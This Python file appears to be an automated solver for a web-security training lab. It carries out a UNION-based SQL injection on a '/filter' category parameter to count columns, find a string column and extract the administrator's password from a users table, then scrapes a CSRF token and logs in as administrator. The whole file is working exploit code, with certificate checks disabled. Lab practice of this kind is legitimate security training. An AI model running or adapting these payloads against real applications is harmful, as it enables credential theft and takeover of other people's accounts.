from ...utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import requests


def solve_lab(url, proxies):
    url = urljoin(url, "/filter")

    print_info("Determining the number of columns...")

    num_columns = 0
    i = 1
    while True:
        params = {"category": f"' ORDER BY {i} -- //"}
        resp = requests.get(url, params=params, proxies=proxies, verify=False)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 500:
            break
        else:
            num_columns += 1
            i += 1

    print_success(f"There are {num_columns} columns.\n")
    print_info("Finding a column with the string data type...")

    i = 0
    while i < num_columns:
        columns = ["null"] * num_columns
        columns[i] = "'aaa'"
        columns = ", ".join(columns)

        params = {"category": f"' UNION SELECT {columns} -- //"}
        resp = requests.get(url, params=params, proxies=proxies, verify=False)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 200:
            break
        else:
            i += 1

    if i == num_columns:
        print_fail("Unable to find a column with the string data type")
    else:
        print_success(f"Column {i} has the string data type.\n")

    columns = ["null"] * num_columns
    columns[i] = "password"
    columns = ", ".join(columns)
    params = {
        "category": f"' UNION SELECT {columns} FROM users WHERE username = 'administrator' --"
    }

    print_info(
        f'Extracting administrator password by visiting "{url}" with the following parameters:'
    )
    print(params)

    resp = requests.get(url, params=params, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    query = soup.find(lambda tag: tag.name == "th")

    if query is None:
        print_fail("Unable to extract administrator password.")

    password = query.text
    print_success(f"Found administrator password: {password}\n")

    url = urljoin(url, "/login")
    print_info(f'Grabbing CSRF value from "{url}"...')

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")

    else:
        print_success(f"CSRF value: {csrf}\n")

    data = {"csrf": csrf, "username": "administrator", "password": password}
    print_info("Logging in with the following values:")
    print(data)

    resp = s.post(
        url,
        proxies=proxies,
        verify=False,
        data=data,
    )
    print_success("SQL injection attack performed.\n")
